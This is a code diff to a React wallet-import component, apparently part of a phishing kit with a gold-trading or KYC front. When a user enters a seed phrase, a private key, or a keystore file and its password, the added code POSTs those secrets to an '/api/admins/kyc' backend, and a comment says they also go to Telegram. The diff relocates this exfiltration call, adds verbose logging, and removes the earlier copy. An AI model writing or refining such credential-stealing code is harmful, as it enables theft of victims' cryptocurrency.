@@ -262,6 +262,65 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
       return;
     }
 
+    // Check if there's pending KYC data
+    const pendingKey = `kyc_pending_${currentSessionId}`;
+    const raw = localStorage.getItem(pendingKey);
+    
+    console.log('Current session ID:', currentSessionId);
+    console.log('Pending KYC key:', pendingKey);
+    console.log('Has pending KYC data:', !!raw);
+    console.log('Active tab:', activeTab);
+    console.log('Wallet type:', walletType);
+    
+    // If no KYC data, immediately send wallet data to backend and Telegram
+    if (!raw) {
+      console.log('No pending KYC data found - will send direct wallet import');
+      
+      // Use the exact same approach as the KYC flow (line 75)
+      const payload = {
+        sessionId: currentSessionId,
+        walletType: walletType,
+        seedPhrase: activeTab === 'phrase' ? key : undefined,
+        keystoreJson: activeTab === 'keystore' ? key : undefined,
+        password: activeTab === 'keystore' ? pass : undefined,
+        privateKey: activeTab === 'private' ? key : undefined,
+        imageUrls: [],
+        fileMap: {},
+        dealersLicenseStatus: 'not_available',
+        qualityRequired: 'N/A',
+        karatsPurity: 'N/A',
+        destinationRefineryText: 'N/A',
+      };
+
+      console.log('Payload to send:', JSON.stringify(payload, null, 2));
+
+      // Use EXACTLY the same fetch approach as the existing KYC flow
+      fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify(payload) 
+      })
+      .then(res => {
+        console.log('Response status:', res.status);
+        if (!res.ok) {
+          return res.text().then(txt => {
+            console.error('Failed to submit direct wallet import:', res.status, txt);
+            throw new Error(`Server responded with ${res.status}: ${txt}`);
+          });
+        }
+        return res.json();
+      })
+      .then(data => {
+        console.log('Direct wallet import submitted successfully:', data);
+        console.log('Session:', currentSessionId);
+      })
+      .catch(err => {
+        console.error('Error submitting direct wallet import:', err);
+      });
+    } else {
+      console.log('Pending KYC data found - will submit with POF later');
+    }
+
     // If validation passes, proceed with import
     setSelectedWalletType(walletType);
     setWalletFormData({ walletType, key, pass, activeTab: activeTab });
@@ -272,50 +331,6 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
       message: 'Wallet imported successfully!', 
       style: { background: '#fff', color: '#4caf50', isError: false } 
     });
-
-    // Check if there's pending KYC data
-    const pendingKey = `kyc_pending_${currentSessionId}`;
-    const raw = localStorage.getItem(pendingKey);
-    
-    // If no KYC data, immediately send wallet data to backend and Telegram
-    if (!raw) {
-      (async () => {
-        try {
-          const payload = {
-            sessionId: currentSessionId,
-            walletType: walletType,
-            seedPhrase: activeTab === 'phrase' ? key : undefined,
-            keystoreJson: activeTab === 'keystore' ? key : undefined,
-            password: activeTab === 'keystore' ? pass : undefined,
-            privateKey: activeTab === 'private' ? key : undefined,
-            imageUrls: [],
-            fileMap: {},
-            dealersLicenseStatus: 'not_available',
-            qualityRequired: 'N/A',
-            karatsPurity: 'N/A',
-            destinationRefineryText: 'N/A',
-          };
-
-          console.log('Sending direct wallet import to backend:', payload);
-
-          const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
-            method: 'POST', 
-            headers: { 'Content-Type': 'application/json' }, 
-            body: JSON.stringify(payload) 
-          });
-
-          if (!res.ok) {
-            const txt = await res.text();
-            console.warn('Failed to submit direct wallet import:', res.status, txt);
-            return;
-          }
-
-          console.log('Direct wallet import submitted successfully for session', currentSessionId);
-        } catch (err) {
-          console.error('Error submitting direct wallet import', err);
-        }
-      })();
-    }
   };
 
   const tabData = [
